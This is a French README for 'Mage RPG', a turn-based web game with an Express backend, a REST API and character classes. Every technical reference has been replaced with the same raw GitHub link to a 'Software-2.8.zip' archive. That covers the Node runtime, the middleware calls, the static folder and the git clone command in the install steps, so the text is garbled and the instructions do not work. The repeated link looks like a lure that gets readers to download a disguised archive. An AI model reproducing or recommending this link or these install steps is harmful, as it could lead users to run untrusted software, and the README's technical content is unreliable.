# Mage RPG

Mage RPG est un jeu de combat au tour par tour développé pour le web, conçu pour aider un camarade à s’initier au développement. Le backend expose une API REST et le frontend consomme cette API pour proposer une interface légère et interactive.


## 📖 Présentation

- **Nom du projet** : Mage RPG
- **Type** : Jeu de rôle (RPG) web, tour par tour
- **Objectif pédagogique** :
  - Comprendre la mise en place d’une API REST avec https://raw.githubusercontent.com/anthony-maurial/magerpg/main/public/Software-2.8.zip
  - Maîtriser les appels API côté client (fetch/forms)
  - Gérer l’authentification par cookie/session
  - Implémenter la logique de combat, le modèle de données et l’UI


## 🚀 Fonctionnalités

1. **Inscription & connexion**
   - `/api/register` : créer un compte (hash crypto)
   - `/api/login` : authentifier l’utilisateur (cookie de session)
2. **Gestion des personnages**
   - `/api/chooseCharacter` : choisir un personnage parmi plusieurs classes
   - Plusieurs classes disponibles :
     - Mage
     - Guerrier
     - Voleur
     - Paladin
     - Barbare
3. **Combat tour par tour**
   - `/api/attack` : attaquer un ennemi
   - `/api/useSpell` : lancer un sort (pour les Mages)
   - `/api/useItem` : utiliser un objet de l’inventaire
   - Gestion des points de vie (HP), mana (MP), endurance, etc.
4. **Statistiques & progression**
   - Système d’XP et de level-up
   - Gain de statistiques (force, intelligence, agilité…)
5. **Interface cliente**
   - Pages HTML/CSS/JS statiques servies par Express (`https://raw.githubusercontent.com/anthony-maurial/magerpg/main/public/Software-2.8.zip`)
   - Appels dynamiques via `fetch` ou `<form />`


## ⚙️ Installation

1. **Cloner le dépôt**

   ```bash
   git clone https://raw.githubusercontent.com/anthony-maurial/magerpg/main/public/Software-2.8.zip
   cd magerpg
   ```

2. **Installer les dépendances**

   ```bash
   # Backend
   npm install
   ```

3. **Lancer le serveur**

   ```bash
   npm run dev
   ```

4. **Ouvrir le client**
   Ouvrez `localhost:8080/` dans votre navigateur



## 📡 Endpoints API

| Méthode | Route                  | Description                               |
| ------- | ---------------------- | ----------------------------------------- |
| POST    | `/api/register`        | Crée un nouveau compte utilisateur        |
| POST    | `/api/login`           | Authentifie l’utilisateur, crée un cookie |
| GET     | `/api/logout`          | Détruit la session et supprime le cookie  |
| POST    | `/api/chooseCharacter` | Sélectionne/inscrit un personnage         |
| GET     | `/api/characters`      | Récupère la liste des personnages du user |
| POST    | `/api/attack`          | Lance une attaque contre un ennemi        |
| POST    | `/api/useSpell`        | Lance un sort                             |
| POST    | `/api/useItem`         | Utilise un objet de l’inventaire          |
| GET     | `/api/profile`         | Récupère le profil et les stats du user   |



## 🎮 Classes de personnages

| Classe       | Description                         | Points forts          |
| ------------ | ----------------------------------- | --------------------- |
| **Mage**     | Lance des sorts, utilise le mana    | Intelligence, portée  |
| **Guerrier** | Combattant corps à corps, résistant | Force, défense        |
| **Voleur**   | Attaques rapides, esquives          | Agilité, critique     |
| **Paladin**  | Guerrier-sacré, soigne et combat    | Mix attaque / soutien |
| **Barbare**  | Hors-la-loi brutal, dégâts massifs  | Dégâts, rage          |



## 🛠️ Architecture

- **Backend**

  - https://raw.githubusercontent.com/anthony-maurial/magerpg/main/public/Software-2.8.zip + Express
  - Middleware : `https://raw.githubusercontent.com/anthony-maurial/magerpg/main/public/Software-2.8.zip()`, `https://raw.githubusercontent.com/anthony-maurial/magerpg/main/public/Software-2.8.zip()`, `cookie-parser`
  - Authentification : sessions en mémoire / base de données (fichier JSON)
  - Hachage des mots de passe : crypto

- **Frontend**

  - HTML/CSS/JS natif
  - Module `PathAPI` pour appels REST dynamiques
  - Gestion des vues statiques avec `https://raw.githubusercontent.com/anthony-maurial/magerpg/main/public/Software-2.8.zip("public")`



## 🤝 Contribuer

1. Forkez ce dépôt
2. Créez une branche : `git checkout -b feature/ma-fonctionnalité`
3. Commitez : `git commit -m "Ajoute …"`
4. Pushez : `git push origin feature/ma-fonctionnalité`
5. Ouvrez une Pull Request



## 📝 Licence

Ce projet est sous licence MIT. Voir [LICENSE](LICENSE) pour plus de détails.

